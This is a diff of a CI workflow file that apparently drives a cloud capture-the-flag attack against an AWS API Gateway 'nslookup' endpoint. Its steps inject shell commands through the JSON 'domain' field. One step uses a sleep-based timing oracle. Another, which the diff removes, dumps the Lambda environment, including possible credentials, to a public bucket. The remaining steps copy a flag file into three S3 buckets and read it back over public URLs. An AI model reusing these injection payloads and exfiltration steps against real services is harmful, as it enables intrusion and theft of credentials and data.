@@ -20,48 +20,65 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      - name: Step 1 - Verify lambda is invoked and find aws CLI path
+      # ===== STEP 1: Timing oracle - MOCK vs real AWS integration =====
+      # If response takes ~25s → lambda IS invoked, injection works
+      # If response is instant (<1s) → pure MOCK, lambda never called
+
+      - name: Timing oracle - inject sleep 25
         run: |
-          echo "===== TEST: write env output to public bucket ====="
-          # If this appears in platform-bucket, lambda IS being invoked (not MOCK)
-          # and we learn: PATH, AWS credentials available to lambdaRole, aws CLI location
+          echo "===== TIMING ORACLE: sleep 25 injection ====="
+          START=$(date +%s%3N)
           curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
             -H "Content-Type: application/json" \
-            -d '{"domain":"x; env | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_dump.txt 2>&1 | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_err.txt"}'
+            -d '{"domain":"x; sleep 25"}' \
+            --max-time 30
+          END=$(date +%s%3N)
+          echo ""
+          echo "Response time: $((END - START)) ms"
+          echo "(< 2000ms = MOCK, >= 25000ms = lambda invoked)"
 
-      - name: Step 2 - Also try explicit aws paths in case not in PATH
+      # ===== STEP 2: S3 exfil - try all 3 buckets as target =====
+      # lambdaRole PutObject may be allowed on a different bucket than platform-bucket
+
+      - name: Inject copy to all 3 buckets
         run: |
-          echo "===== TEST: try known aws CLI paths ====="
-          for AWS_PATH in "aws" "/opt/bin/aws" "/opt/aws/bin/aws" "/var/lang/bin/aws"; do
-            curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
-              -H "Content-Type: application/json" \
-              -d "{\"domain\":\"x; echo $AWS_PATH > /tmp/p.txt && $AWS_PATH s3 cp /tmp/p.txt s3://platform-bucket-009661764077-us-east-1/awspath_${AWS_PATH//\//_}.txt\"}"
-            sleep 1
-          done
+          echo "===== EXFIL ATTEMPT 1: -> codec4f26c862a321ef5 ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag_out.txt"}'
 
-      - name: Wait for lambda executions to complete
+          echo "===== EXFIL ATTEMPT 2: -> platform-bucket ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"}'
+
+          echo "===== EXFIL ATTEMPT 3: -> site781fe43f26b9eba3 ====="
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+            -H "Content-Type: application/json" \
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag_out.txt"}'
+
+      - name: Wait for lambda executions
         run: sleep 15
 
-      - name: Step 3 - Check what appeared in public bucket
-        run: |
-          echo "===== CHECK: env dump ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_dump.txt"
-          echo ""
-          echo "===== CHECK: error output ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_err.txt"
-          echo ""
-          echo "===== CHECK: which aws path worked ====="
-          for AWS_PATH in "aws" "opt_bin_aws" "opt_aws_bin_aws" "var_lang_bin_aws"; do
-            echo "--- $AWS_PATH ---"
-            curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/awspath_${AWS_PATH}.txt"
-          done
+      # ===== STEP 3: Check with s3 ls (confirmed working under Statement2) =====
 
-      - name: Step 4 - If tests passed, grab the actual flag
+      - name: Check all buckets for flag_out.txt via s3 ls
         run: |
-          echo "===== FINAL: copy flag to public bucket ====="
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_exfil.txt"}'
-          sleep 10
-          echo "===== FLAG ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag_exfil.txt"
+          echo "===== ls codec4f26c862a321ef5 ====="
+          aws s3 ls s3://codec4f26c862a321ef5/ --recursive
+
+          echo "===== ls platform-bucket ====="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
+
+          echo "===== ls site781fe43f26b9eba3 ====="
+          aws s3 ls s3://site781fe43f26b9eba3/ --recursive
+
+      # ===== STEP 4: If flag appeared - read it =====
+
+      - name: Try reading flag_out from public bucket (no creds needed)
+        run: |
+          echo "===== curl platform-bucket/flag_out.txt ====="
+          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag_out.txt"
+          echo ""
+          echo "===== curl cloudfront/flag_out.txt (site bucket via IL-accessible CDN) ====="
+          curl -s "https://d67nf28gqfurd.cloudfront.net/flag_out.txt"
